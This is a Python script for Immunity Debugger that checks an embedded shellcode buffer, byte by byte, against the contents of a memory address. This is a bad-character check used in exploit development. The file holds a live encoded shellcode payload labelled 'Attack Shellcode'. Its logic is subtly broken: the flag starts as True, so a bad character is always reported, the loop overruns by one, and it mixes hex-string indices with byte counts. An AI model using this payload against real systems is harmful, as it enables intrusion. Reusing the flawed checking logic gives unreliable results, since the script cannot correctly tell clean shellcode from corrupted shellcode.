from immlib import *

def main(args):
    imm = Debugger()

    bad_char_found = True

    # First argument is the address to begin our search
    address = int(args[0], 16)

    # Shellcode to verify
    shellcode           = "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a\x1c\x39\xbd"
    shellcode_length    = len(shellcode)

    canvas_shellcode    = shellcode.encode("HEX")
    debug_shellcode     = imm.readMemory( address, shellcode_length )
    debug_shellcode     = debug_shellcode.encode("HEX")

    imm.log("Address: 0x%08x" % address)
    imm.log("Shellcode Length : %d" % shellcode_length)

    imm.log("Attack Shellcode: %s" % canvas_shellcode[:shellcode_length])
    imm.log("In Memory Shellcode: %s" % debug_shellcode[:shellcode_length])

    # Begin a byte-by-byte comparison of the two shellcode buffers
    count = 0
    while count <= shellcode_length:
        if debug_shellcode[count] != canvas_shellcode[count]:
            imm.log("Bad Char Detected at offset %d" % count)
            bad_char_found = True
            break
        count += 1

    if bad_char_found:
        imm.log("[*****] ")
        imm.log("Bad character found: %s" % debug_shellcode[count])
        imm.log("Bad character original: %s" % shellcode[count])
        imm.log("[*****] ")
    return "[*] !badchar finished, check Log window."